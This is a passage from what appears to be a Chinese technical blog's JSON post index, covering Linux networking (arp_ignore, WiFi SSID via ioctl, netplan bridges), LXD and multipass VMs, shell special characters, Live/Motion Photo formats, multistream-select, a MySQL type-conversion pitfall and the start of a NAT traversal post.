htons(ARPOP_REQUEST) \u0026amp;\u0026amp; // 判断是不是本地地址 inet_addr_type(net, tip) == RTN_LOCAL \u0026amp;\u0026amp; // 判断是否开启 arp_ignore !arp_ignore(in_dev, sip, tip)) // 回复网卡 mac arp_send(ARPOP_REPLY, ETH_P_ARP, sip, dev, tip, sha, dev-\u0026gt;dev_addr, sha); goto out; } ... } 根据 arp_process 函数所示，如果内核没有开启 arp_ignore，那么哪个网卡收到的 arp 包，就会回复那个网卡的 mac 地址 。\n尝试开启 arp_ignore：\n1 echo \u0026#34;1\u0026#34; \u0026gt; /proc/sys/net/ipv4/conf/all/arp_ignore 此时再去执行 ping 操作，发现此时无法 ping 通 192.168.123.5.\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/linux-%E4%B8%8B-arp_ignore-%E9%97%AE%E9%A2%98/","title":"Linux 下 arp_ignore 问题"},{"content":"Linux 下编码获取当前连接 WiFi Python 版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 # !/usr/bin/env python3 import array import socket import struct from fcntl import ioctl IFNAMESIZE = 20 ESSODMAXSIZE = 32 SIOCGIWESSID = 0x8B1B NET_PATH = \u0026#34;/sys/class/net\u0026#34; class Point(object): \u0026#34;\u0026#34;\u0026#34; Class to hold iw_point data. \u0026#34;\u0026#34;\u0026#34; def __init__(self, data=None, flags=0): if data is None: raise ValueError(\u0026#34;data must be passed to Iwpoint\u0026#34;) # P pointer to data, H length, H flags self.fmt = \u0026#39;PHH\u0026#39; self.flags = flags self.buff = array.array(\u0026#39;b\u0026#39;, data.encode()) self.caddr_t, self.length = self.buff.buffer_info() self.packed_data = struct.pack(self.fmt, self.caddr_t, self.length, self.flags) def update(self, packed_data): \u0026#34;\u0026#34;\u0026#34; Updates the object attributes. \u0026#34;\u0026#34;\u0026#34; self.packed_data = packed_data self.caddr_t, self.length, self.flags = struct.unpack(self.fmt, self.packed_data) def _fcntl(request, args): sockfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) return ioctl(sockfd.fileno(), request, args) def iw_get_ext(ifname, request, data=None): \u0026#34;\u0026#34;\u0026#34; Read information from ifname. \u0026#34;\u0026#34;\u0026#34; buff = IFNAMESIZE - len(ifname) ifreq = array.array(\u0026#39;b\u0026#39;, ifname.encode() + (\u0026#39;\\0\u0026#39; * buff).encode()) # put some additional data behind the interface name if data is not None: ifreq.frombytes(data) else: # extend to 32 bytes for ioctl payload ifreq.extend(\u0026#39;\\0\u0026#39; * 16) result = _fcntl(request, ifreq) return result, ifreq[IFNAMESIZE:] def get_essid(ifname) -\u0026gt; str: point = Point(\u0026#39;\\x00\u0026#39; * ESSODMAXSIZE) iw_get_ext(ifname, SIOCGIWESSID, point.packed_data) raw_essid = point.buff.tobytes() return raw_essid.strip(\u0026#39;\\x00\u0026#39;.encode()).decode() if __name__ == \u0026#39;__main__\u0026#39;: print(get_essid(\u0026#34;wlo1\u0026#34;)) Go 版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import ( \u0026#34;bytes\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // Ioctl 方法：https://man7.org/linux/man-pages/man2/ioctl.2.html func Ioctl(fd uintptr, request uintptr, argp uintptr) error { _, _, err := unix.Syscall(unix.SYS_IOCTL, fd, request, argp) if err != 0 { return os.NewSyscallError(\u0026#34;Ioctl: \u0026#34;, err) } return nil } func GetConnectedWiFi(dev string) (string, error) { const ( SIOCGIWESSID = 0x8B1B ESSODMAXSIZE = 32 ) ifr := make([]byte, 40) fd, err := unix.Socket(unix.AF_INET, unix.SOCK_DGRAM, 0) if err != nil { return \u0026#34;\u0026#34;, err } defer unix.Close(fd) copy(ifr[:], dev) buff := make([]byte, ESSODMAXSIZE) *(*uintptr)(unsafe.Pointer(\u0026amp;ifr[unix.IFNAMSIZ])) = uintptr(unsafe.Pointer(\u0026amp;buff[0])) *(*uint16)(unsafe.Pointer(\u0026amp;ifr[unix.IFNAMSIZ+unsafe.Sizeof(\u0026amp;buff[0])])) = ESSODMAXSIZE err = Ioctl(uintptr(fd), SIOCGIWESSID, uintptr(unsafe.Pointer(\u0026amp;ifr[0]))) if err != nil { return \u0026#34;\u0026#34;, err } return string(bytes.Trim(buff, \u0026#34;\\x00\u0026#34;)), nil } func main() { ssid, err := GetConnectedWiFi(\u0026#34;wlo1\u0026#34;) if err != nil { panic(err) } fmt.Println(ssid) } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/linux-%E4%B8%8B%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5-wifi/","title":"Linux 下获取当前连接 WiFi"},{"content":"在 Linux 中有一些特殊字符，它们在命令中有着特殊的用法。掌握了这些字符能让你在 Linux 学习中更加如鱼得水。\n一、 ~ 波浪号 ~ 指的是主目录，即是用户的个人目录，无论你身在何方，只要输入 cd ~ 就能立即回到主目录\n1 2 [GNU@ec Pictures]$ cd ~ [GNU@ec ~] 二、. 英文句号 . 代表当前目录，使用 . 可以缩短我们的文件路径。 使用 ls 命令查看当前目录下所有文件，第一个就是 . 文件： 三、.. 两个英文句号 . 代表上级目录，即父目录，使用 .. 可以缩短我们的文件路径。 使用 ls 命令查看当前目录下所有文件，第二个就是 .. 文件： 四、/ 斜杠 / 既指的是路径目录分隔符，也指的是根目录。 在输入文件路径时使用 / 分隔不同目录，使用 cd / 命令时可以直接回到根目录。\n五、# 以 # 开头的话是注释\n1 # GNU\u0026#39;s Not Unix! 注释虽然会被解释器忽略，但是它还是会添加到用户的命令历史记录中。\n六、? 问号 ?，是单字符通配符，它在Bash Shell中可以匹配任意一个字符： 如果想要匹配多个字符，就可以输入多个 ? ： 七、* 星号 * 代表的是任意字符序列，匹配任意字符，包括空字符： 八、[] 方括号 [] 指的是字符集通配符，匹配至少有一个和字符集字符匹配的字符： 九、; 分号 ; 主要是用来分隔命令的，使用了 ; 之后就可以在一行书写多条命令： 十、\u0026lt; 在 Linux 中的很多命令允许接受一个文件作为参数，并从该文件中获取数据。这些命令中的大多数还可以从流中获取输入。要创建一个流，可以使用左尖括号 \u0026ldquo;\u0026lt;\u0026rdquo; ，如下将文件重定向到命令中： 十一、\u0026gt; 输入和输出是相反的。右尖括号 \u0026gt; 将命令的输出进行重定向，一般是将输出结果重定向到文件中： 十二、! 感叹号 ! 在Linux中可以代表着可以执行逻辑非运算，即将命令的返回值进行非运算。 感叹号 ! 还可以从历史命令中取出一条命令来执行\n1 2 3 [GNU@ec ~]$!1 # 执行第一条命令 [GNU@ec ~]$!?soft # 执行最近一次包含soft的命令 [GNU@ec ~]$!! # 执行上一条命令 十三、\u0026amp; 连接符 \u0026amp; 可以将程序放到后台执行。在执行命令后加上 \u0026amp; 即可将程序放到后台进行执行。若想要恢复至前台执行，使用 fg [工作号] 命令即可： 两个连接符 \u0026amp;\u0026amp; 代表的是做 且 运算，只有前面的命令执行成功时才能执行后面的命令：\n1 [GNU@ec ~]$ [! -d hello] \u0026amp;\u0026amp; mkdir hello # 如果当前目录下没有hello目录就创建一个hello目录 十四、|【连接命令】 | 的左右看成将命令链接在一起的管道，它将前一个命令的输出作为后一个命令的输入进行传递： || 代表着做或运算，前面的命令执行失败时执行后面的命令\n1 [GNU@ec ~]$ cat hello \u0026amp;\u0026amp; touch hello # 查看hello文件，没有的话创建一个 十五、$ 在Linux中以 $ 开头通常表示变量，例如一些系统变量\n1 2 3 4 [GNU@ec ~]$ echo $PATH /usr/lib64/qt-3.3/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/GNU/.local/bin:/home/GNU/bin [GNU@ec ~]$ echo $USER GNU 十六、` 反引号 ` 可以用来替换命令。 命令替换是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。语法：`command`\n1 2 3 [GNU@ecs ~]$ dAte=`date` [GNU@ecs ~]$ echo \u0026#34;Date is $dAte\u0026#34; Date is Fri Mar 13 20:31:58 CST 2020 十七、引用特殊字符 由于在 Linux 中这么多的特殊字符都有着自己的独特的作用，当我们想将这些特殊字符当作普通字符进行使用时就会有报错的风险。因此我们就需要想办法对这些特殊字符进行转义操作：\n使用双引号 \u0026quot; \u0026ldquo; 括起来，不过这对 $ 无效 1 2 3 4 [GNU@ec ~]$ echo \u0026#34;This is a \u0026amp;\u0026#34; This is a [GNU@ec ~]$ echo \u0026#34;Today is $(date)\u0026#34; Today is Tue Mar 3 21:14:06 CST 202 用单引号 \u0026rsquo; \u0026lsquo; 括起来，停止所有特殊字符的功 1 2 [GNU@ec ~]$ echo \u0026#39;This is a |\u0026#39; This is a | 反斜杠 \\ 转义，在大多数场合通用 1 2 [GNU@ec ~]$ echo This is a \\* This is a * ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/linux%E5%B8%B8%E7%94%A8%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/","title":"Linux常用特殊字符"},{"content":"在 linux 里，当我们修改了配置文件，不想让linux重启时就可以通过重载配置文件使配置文件生效。 例如，刚修改 /etc/profile文件，我想让刚刚作出的修改立刻看到效果，但又不愿意重启，这时，就可以通过重载配置文件来使配置文件立即生效：\n1 2 3 4 # 方式一： source /etc/profile # 方式二： . /etc/profile Ps：source命令也称为“点命令”，也就是一个点符号（.）\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/linux%E9%87%8D%E8%BD%BD%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","title":"Linux重载配置文件"},{"content":"Live Photo 详解 实况照片是苹果公司首先在 iPhone 6S 上发布的一个功能，后面安也同样发布了类似的功能。\n在实况开启之后，相机会自动记录按下快门前后各1.5秒的画面，实况照片默认是静止的，长按实况照片可以显示视频。\n苹果——Live Photos 苹果拍摄 Live Photos 实际上是包含一个图片文件（开启高效模式为 HEIC 格式，未开启为 JPG 格式）和一个 MOV 的视频文件。\n如下测试文件：\nMOV 视频：MOV\nJGP 图片：\n使用 exiftool 查看两个文件的 metadata，图片的元数据中有一个 Media Group UUID：\nMedia Group UUID : 764134D7-D2D7-4B70-99FE-63FCF10E57BC MOV 视频中有一个 Content Identifier：\nContent Identifier : 764134D7-D2D7-4B70-99FE-63FCF10E57BC 当一个照片文件和一个视频文件名字相同（后缀不一样），且 metadata 中包含各自所需的字段，且两个字段的 UUID 一样时，就可以调用照片应用的 API 将这两个文件关联为一个 Live Photos 资源，关联成功后就会在照片中显示 Live Photos。\n可以发现，苹果的 Live Photos 实际上是苹果的照片应用将视频和图片进行了一个组合显示, 下面是一个使用 swift 导入 Live Photos 的例子:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func exportLivePhoto () { PHPhotoLibrary.shared().performChanges({ () -\u0026gt; Void in let creationRequest = PHAssetCreationRequest.forAsset() let options = PHAssetResourceCreationOptions() // 添加 MOV creationRequest.addResource(with: PHAssetResourceType.pairedVideo, fileURL: URL(fileURLWithPath: FilePaths.VidToLive.livePath + \u0026#34;/IMG.MOV\u0026#34;), options: options) // 添加 图片 creationRequest.addResource(with: PHAssetResourceType.photo, fileURL: URL(fileURLWithPath: FilePaths.VidToLive.livePath + \u0026#34;/IMG.JPG\u0026#34;), options: options) }, completionHandler: { (success, error) -\u0026gt; Void in if !success { DTLog((error?.localizedDescription)!) } }) } 安卓——Motion Photos Motion Photos 是安卓采用的 Live Photo 方案, Motion Photos 和 苹果的 Live Photos 不同, Motion Photos 是一个 JPG 格式的图片, 他在文件内部嵌入了 Video 的数据, 文件内部结构如下所示:\nMotion Photo structure 下面是一张使用小米手机拍摄的 Motion Photos: 使用 exiftool 查看它的 metadata, 会发现如下信息:\nMicro Video Version : 1 Micro Video : 1 Micro Video Offset : 1734313 Micro Video Presentation Timestamp Us: 861243 这个就是隐藏在图片中的视频的信息了, 使用 dd 命令提取出视频来:\n1 2 # bs = filesize - Micro Video Offset dd if=motion.jpg of=video.mp4 bs=2979693 skip=1 提取出来的视频如链接所示: Motion Video\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/live-photo%E8%AF%A6%E8%A7%A3/","title":"Live Photo详解"},{"content":"Lxd 安装 Windows 虚拟机 准备工作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // 1. 运行环境准备 sudo snap install distrobuilder --classic sudo snap install lxd sudo apt install libguestfs-tools wimtools virt-viewer // 2. 下载 windows iso 镜像文件 wget https://software-download.microsoft.com/db/Win10_20H2_English_x64.iso?t=d94b7d1c-76a5-4fc9-9372-0c7e2b74c388\u0026amp;e=1640042095\u0026amp;h=efb6561a35f49728f432c77a95eed3fe // 3. 制作 lxc 镜像文件 sudo distrobuilder repack-windows Win10_20H2_English_x64.iso win.iso INFO\tMounting Windows ISO INFO\tDownloading drivers ISO INFO\tMounting driver ISO INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;boot.wim\u0026#34;, \u0026#34;index\u0026#34;: 2} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 1} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 2} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 3} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 4} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 5} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 6} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 7} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 8} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 9} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 10} INFO\tModifying WIM file\t{\u0026#34;file\u0026#34;: \u0026#34;install.wim\u0026#34;, \u0026#34;index\u0026#34;: 11} INFO\tGenerating new ISO INFO\tRemoving cache directory 创建与运行虚拟机 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 1. 使用默认项初始化 lxc 配置 // 2. 创建一个空的虚拟机 lxc init win10 --empty --vm -c security.secureboot=false // 3. 为虚拟机分配磁盘 lxc config device override win10 root size=50GiB // 4. 加载打包好的 iso 镜像 lxc config device add win10 iso disk source=win.iso boot.priority=10 // 5. 开始运行虚拟机 lxc start win10 --console=vga 开始运行虚拟机后就会进入到这个界面：\n然后完成 windows 的安装流程后就可以正常使用 windows 虚拟机了。\n后续可以使用 lxc console --type=vga启动虚拟机。\nreference：\nlxc/distrobuilder: System container image builder for LXC and LXD (github.com) LXD documentation (linuxcontainers.org) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/lxd-%E5%AE%89%E8%A3%85-windows-%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"Lxd 安装 Windows 虚拟机"},{"content":"使用 netplan 创建 bridge 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # 根据实际情况编辑 netplan 文件，系统默认会创建一个 # /etc/netplan/50-cloud-init.yaml network: version: 2 ethernets: enp2s0: addresses: - \u0026#34;192.168.5.11/24\u0026#34; nameservers: addresses: - 192.168.5.1 search: [] routes: - to: \u0026#34;default\u0026#34; via: \u0026#34;192.168.5.80\u0026#34; bridges: br0: dhcp4: false addresses: [192.168.5.40/24] interfaces: - enp2s0 gateway4: 192.168.5.80 nameservers: addresses: [192.168.5.1,223.5.5.5,1.1.1.1 ] parameters: forward-delay: 0 stp: false optional: true 应用 netplan 配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 配置验证 netplan try # 应用配置 netplan apply # 查看创建的 br0 网卡 root@k8s:~# ip a ... 5: br0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 06:59:59:0e:14:4c brd ff:ff:ff:ff:ff:ff inet 192.168.5.40/24 brd 192.168.5.255 scope global br0 valid_lft forever preferred_lft forever inet6 fe80::459:59ff:fe0e:144c/64 scope link valid_lft forever preferred_lft forever 安装和配置 lxd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # snap 安装 lxd snap install lxd # lxd 初始化配置 root@k8s:~# lxd init Would you like to use LXD clustering? (yes/no) [default=no]: Do you want to configure a new storage pool? (yes/no) [default=yes]: Name of the new storage pool [default=default]: Name of the storage backend to use (dir, lvm, powerflex, zfs, btrfs, ceph) [default=zfs]: Create a new ZFS pool? (yes/no) [default=yes]: Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: Size in GiB of the new loop device (1GiB minimum) [default=19GiB]: 100GiB # 根据实际情况选择大容量，后续 multipass 创建的虚拟机会放在这里 Would you like to connect to a MAAS server? (yes/no) [default=no]: Would you like to create a new local network bridge? (yes/no) [default=yes]: no # 我们已经手动创建了 br0，因此不需要 lxd 再创建 bridge 网卡 Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: Would you like the LXD server to be available over the network? (yes/no) [default=no]: Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: Would you like a YAML \u0026#34;lxd init\u0026#34; preseed to be printed? (yes/no) [default=no]: 安装和配置 multipass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # 安装 multipass snap install multipass # !!! 注意⚠️ # 当将多通道后端切换到 lxd 后，在现有后端（qemu）上运行的实例将被隐藏！ # 建议先停止当前所有实例 multipass stop --all # 将 multipass 后端由 qemu 变更为 lxd multipass set local.driver=lxd # 检查后端驱动是否发生变更 root@k8s:~# multipass get local.driver lxd # 将 lxd 连接到 multipass snap connect multipass:lxd lxd # 确认已经连接到 lxd root@k8s:~# snap connections multipass | grep lxd lxd multipass:lxd lxd:lxd - # 检查 br0 是否被 multipass 识别 root@k8s:~# multipass networks Name Type Description br0 bridge Network bridge with enp2s0 enp2s0 ethernet Ethernet device mpbr0 bridge Network bridge for Multipass 使用 multipass 创建桥接模式虚拟机 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # 创建虚拟机 multipass launch node --network br0 # 查看虚拟机 root@k8s:~# multipass list Name State IPv4 Image node Running 10.110.224.184 Ubuntu 24.04 LTS 192.168.5.49 # 查看宿主机网络可以看到虚拟机的两张网卡 root@k8s1:~# ip a ... 7: tap06d9eb7f: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq master mpbr0 state UP group default qlen 1000 link/ether e6:af:7b:08:3a:f2 brd ff:ff:ff:ff:ff:ff 8: tap35adde70: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq master br0 state UP group default qlen 1000 link/ether ea:77:45:5d:3d:af brd ff:ff:ff:ff:ff:ff # 进入虚拟机 multipass shell node # 在虚拟机中查看网卡 ubuntu@node:~$ ip a ... 2: enp5s0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 52:54:00:57:95:6e brd ff:ff:ff:ff:ff:ff inet 10.110.224.184/24 metric 100 brd 10.110.224.255 scope global dynamic enp5s0 valid_lft 3386sec preferred_lft 3386sec inet6 fd42:ee96:be30:827a:5054:ff:fe57:956e/64 scope global mngtmpaddr noprefixroute valid_lft forever preferred_lft forever inet6 fe80::5054:ff:fe57:956e/64 scope link valid_lft forever preferred_lft forever 3: enp6s0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 52:54:00:48:fb:1d brd ff:ff:ff:ff:ff:ff inet 192.168.5.49/24 metric 200 brd 192.168.5.255 scope global dynamic enp6s0 valid_lft 86189sec preferred_lft 86189sec inet6 fe80::5054:ff:fe48:fb1d/64 scope link valid_lft forever preferred_lft forever # 网络连通性测试 ubuntu@node:~$ ping 192.168.5.1 PING 192.168.5.1 (192.168.5.1) 56(84) bytes of data. 64 bytes from 192.168.5.1: icmp_seq=1 ttl=64 time=0.763 ms 64 bytes from 192.168.5.1: icmp_seq=2 ttl=64 time=1.46 ms 64 bytes from 192.168.5.1: icmp_seq=3 ttl=64 time=0.860 ms ... ubuntu@node2:~$ ping 223.5.5.5 PING 223.5.5.5 (223.5.5.5) 56(84) bytes of data. 64 bytes from 223.5.5.5: icmp_seq=1 ttl=115 time=7.11 ms 64 bytes from 223.5.5.5: icmp_seq=2 ttl=115 time=7.18 ms ... 至此，利用 multipas 创建桥接主机网络的虚拟机完成。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/multipass-%E5%88%9B%E5%BB%BA%E6%A1%A5%E6%8E%A5%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"Multipass 创建桥接宿主机的虚拟机"},{"content":"Multistream-Select 流程分析 简介 Multistream-Select 是一个协议选择机制，允许在单一连接上支持多种不同的协议通信。它提供了一种方式，让客户端和服务端在连接建立后选择使用哪种协议进行通信。go-multistream 是这个协议的一个 Go 语言实现，通过提供一个简单的流路由器（Stream Router），来管理和处理不同协议的选择和通信。\n协议选择流程 1. 设置多流复用器（Muxer） 首先，需要创建一个多流复用器（Muxer），它负责管理和路由不同协议的通信。Muxer 可以看作是一个接线员，负责将连接分配给正确的协议处理器。\n流程图：\nflowchart TD A[创建 Multistream Muxer] --\u0026gt; B[为每个协议添加处理器] 2. 监听和接受连接 服务端需要监听一个特定的端口，等待客户端的连接请求。当有客户端连接时，Muxer 会接受这个连接。\n流程图：\nflowchart TD A[服务端监听端口] --\u0026gt; B[接受客户端连接] 3. 协议选择 主动选择：客户端可以主动指定要使用的协议。这可以通过 SelectProtoOrFail 方法或创建一个 MSSelect 对象来实现。客户端会发送一个协议选择请求给服务端。\n被动选择：服务端可以根据客户端的请求来选择协议。Muxer 会根据预先设定的处理器来处理连接。\n流程图：\nflowchart TD A[客户端连接] --\u0026gt; B{主动选择协议?} B --\u0026gt;|是| C[发送协议选择请求] B --\u0026gt;|否| D[等待服务端选择协议] C --\u0026gt; E[服务端处理协议选择请求] D --\u0026gt; E E --\u0026gt; F[选择合适的处理器] 4. 处理连接 一旦协议选择完成，Muxer 会将连接传递给对应的协议处理器。处理器负责处理这个连接上的所有通信。\n流程图：\nflowchart TD A[协议选择完成] --\u0026gt; B[将连接传递给处理器] B --\u0026gt; C[处理连接上的通信] 5. 数据传输与关闭 数据传输：客户端和服务端通过选择的协议进行数据交换。 连接关闭：当通信完成或出现错误时，连接会被关闭。 流程图：\nflowchart TD A[数据交换] --\u0026gt; B{通信完成或错误?} B --\u0026gt;|是| C[关闭连接] B --\u0026gt;|否| A 完整流程图 flowchart TD A[创建 Multistream Muxer] --\u0026gt; B[为每个协议添加处理器] B --\u0026gt; C[服务端监听端口] C --\u0026gt; D[接受客户端连接] D --\u0026gt; E{主动选择协议?} E --\u0026gt;|是| F[发送协议选择请求] E --\u0026gt;|否| G[等待服务端选择协议] F --\u0026gt; H[服务端处理协议选择请求] G --\u0026gt; H H --\u0026gt; I[选择合适的处理器] I --\u0026gt; J[将连接传递给处理器] J --\u0026gt; K[处理连接上的通信] K --\u0026gt; L{通信完成或错误?} L --\u0026gt;|是| M[关闭连接] L --\u0026gt;|否| K 理解流程 多流复用器：可以想象成一个电话交换机，它接听来自客户端的电话（连接），并根据客户端的需求（协议选择）将电话转接给合适的接线员（处理器）。\n协议选择：就像是选择你要用什么语言与对方交流，客户端可以告诉服务端“我要用中文/英文/法语交流”，服务端则会根据这个选择来进行相应的处理。\n处理连接：一旦协议选择好，通信就按照这个协议进行。就像是双方开始用选定的语言交流。\n数据传输与关闭：就像是双方交流完毕后，挂断电话（关闭连接）。\n通过这个流程，go-multistream 库让不同协议在同一连接上进行选择和通信变得简单易行，适用于需要灵活性和效率的网络应用场景。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/mutlistream-select-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","title":"mutlistream-select 流程分析"},{"content":"MySQL 类型转换的坑 一、BUG复现 1. 表字段 字段名 类型 长度 主键 非空 id int 2 True True name varchar 255 False True 2. 表记录 id name 0 张三 1 李四 2 王五 3. sql语句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 select * from demo where id=0; Result: +----+----------+ | id | name | +----+----------+ | 0 | 张三 | +----+----------+ select * from demo where id=\u0026#39;0\u0026#39;; Result: +----+----------+ | id | name | +----+----------+ | 0 | 张三 | +----+----------+ select * from demo where id=\u0026#39;hhh\u0026#39;; Result: +----+----------+ | id | name | +----+----------+ | 0 | 张三 | +----+----------+ select * from demo where id=\u0026#39;1\u0026#39;; Result: +----+----------+ | id | name | +----+----------+ | 1 | 李四 | +----+----------+ select * from demo where id=\u0026#39;1hhh\u0026#39;; Result: +----+----------+ | id | name | +----+----------+ | 1 | 李四 | +----+----------+ select * from demo where id=\u0026#39;hhh1\u0026#39;; Result: +----+----------+ | id | name | +----+----------+ | 0 | 张三 | +----+----------+ 二、问题原因 查阅 MySQL 官方文档后发现 文档中有这样一句话：\nComparison operations result in a value of 1 (TRUE), 0 (FALSE), or NULL. These operations work for both numbers and strings. Strings are automatically converted to numbers and numbers to strings as necessary.\n意思是在做两个值的比较时，比较运算的结果是1 （TRUE），0 （FALSE）或NULL。这些操作适用于数字和字符串。字符串会自动转换为数字，数字会根据需要转换为字符串。\n在 sql语句中，如果字符串开头是数字，则将字符串转化为开头的数字；对于非开头的 sql语句，字符串默认转换为 0 。\n三、解决办法 注意书写格式 既然 MySQL 的类型转换有这么多的坑，那我们在书写 sql语句时首先要明确字段的类型，使用相同类型的数据做判断。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/mysql-%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%9A%84%E5%9D%91/","title":"MySQL 类型转换的坑"},{"content":"NAT 穿透 NAT可以分为\n对称型：外网端口由源IP，源port，目的IP，目的port共同决定。即同一源IP和源端口，不同的目的IP，端口会被NAT映射为不同的端口\n非对称型：外网端口由源IP，源端口决定。即同一源IP和源端口被NAT映射为同一端口。\n穿透需要根据不同的NAT类型采取不同的策略。 判断NAT类型的方法如下：\nsequenceDiagram P1-\u0026gt;\u0026gt;NAT1: 192.168.1.2:1234--\u0026gt;3.3.3.3:8080 NAT1-\u0026gt;\u0026gt;Coordinator: 1.1.1.1:aaaa--\u0026gt;3.3.3.3:8080 P1-\u0026gt;\u0026gt;NAT1: 192.168.1.2:1234--\u0026gt;3.3.3.3:8081 NAT1-\u0026gt;\u0026gt;Coordinator: 1.1.1.1:bbbb--\u0026gt;3.3.3.38081 Coordinator-\u0026gt;\u0026gt;Coordinator: aaaa = bbbb? 如上图所示：\n内网机器P1向公网Coordinator的8080端口发送UDP报文 报文经过NAT1后源端口会映射为aaaa 公网Coordinator收到报文后可以看到其源端口为aaaa P1使用步骤1同样的源端口向Coordinator的另一个端口发送UDP报文 NAT1收到报文后将源端口映射为bbbb 公网Coordinator收到报文后可以看到其源端口bbbb 比较aaaa和bbbb，如果相同则为非对称型NAT，反正则为对称型 双非对称型NAT内网穿透 sequenceDiagram P1-\u0026gt;\u0026gt;NAT1: 192.168.1.2:1234--\u0026gt;2.2.2.2:4321 ttl=5 NAT1--\u0026gt;\u0026gt;NAT2: droped P2-\u0026gt;\u0026gt;NAT2: 192.168.1.2:1234--\u0026gt;1.1.1.1:5678 NAT2-\u0026gt;\u0026gt;NAT1: 2.2.2.2:4321--\u0026gt;1.1.1.1:5678 NAT1-\u0026gt;\u0026gt;P1: 2.2.2.2:4321--\u0026gt;192.168.1.2:1234 如上图所示： P1和P2为两个内网机器，其内网地址都为192.168.1.2，NAT1和NAT2为非对称型NAT，其外网地址分别为1.1.1.1和2.2.2.2。\n内网穿透步骤如下：\nP1和P2绑定任意本地端口（这里为1234），通过coordinator找到其对应的外网端口，并通知对方（这里P1的外网端口5678，P2的外网端口为4321） P1发送UDP报文至P2，其TTL设定一个较小的值，确保报文在到达NAT2之前被丢弃 P2发送UDP报文至P1 对称-非对称内网穿透 sequenceDiagram P1-\u0026gt;\u0026gt;P2: 192.168.1.2:1234--\u0026gt;2.2.2.2:2000 ttl=5 P1-\u0026gt;\u0026gt;P2: 